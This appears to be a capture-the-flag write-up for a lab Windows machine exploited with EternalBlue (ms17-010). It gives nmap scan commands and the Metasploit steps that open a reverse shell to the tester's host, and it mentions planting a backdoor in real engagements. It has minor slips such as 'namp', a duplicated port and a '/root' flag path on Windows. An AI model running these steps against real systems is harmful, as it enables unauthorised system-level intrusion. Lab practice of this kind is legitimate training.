## Initial Access - EternalBlue + Metasploit

**Vulnerability Explanation:** The machine is vulnerable to EternalBlue. EternalBlue is an infamous exploit of the SMB port against old Windows machines. A publicly available exploit is used to gain access to the machine.

**Vulnerability Fix:** Disable the SMB port. Upgrade the system to one that is not vulnerable to EternalBlue.

**Severity:** Critical

**Steps to reproduce the attack:** 

**Port Scan Results**

**TCP:** 135,139,445,49152,49153,49153,49154,49155,49156,49157

**UDP:** N/A

Use nmap to scan the target for open ports.

TCP ports 135, 139, 445, 49152-49157 were discovered.

```shell
sudo nmap -p- -T5 -vvv -oN nmap.initial 10.10.10.40
```

Enumerate further on port 445, SMB, using nmap scripting engine(NSE). The target machine is vulnerable to EternalBlue(ms17-010).

```shell
sudo namp -sV -p 445 --script "vuln" 10.10.10.40
```

Using Metasploit, search for the exploit, set the parameters and run it to gain a shell on the target machine.

```shell
sudo msfconsole
```

```
search ms17-010
```
```
use 0
```

```
set RHOSTS 10.10.10.40
```
```
set LHOST 10.10.16.10
```

```
run
```

We have successfully got initial access to the machine as ‘nt authority’.

‘nt authority’ is a high privileged user so privilege escalation is not needed.
## Privilege Escalation - N/A

**Vulnerability Explanation:** N/A

**Vulnerability Fix:** N/A

**Severity:** N/A

**Steps to reproduce the attack:** N/A

## Post Exploitation

Since this is a CTF the objective is only to retreive the flag located in the /root directory as a privileged user. 

In a real world assessment, we would attempt to add a back door for continuous access to the machine.
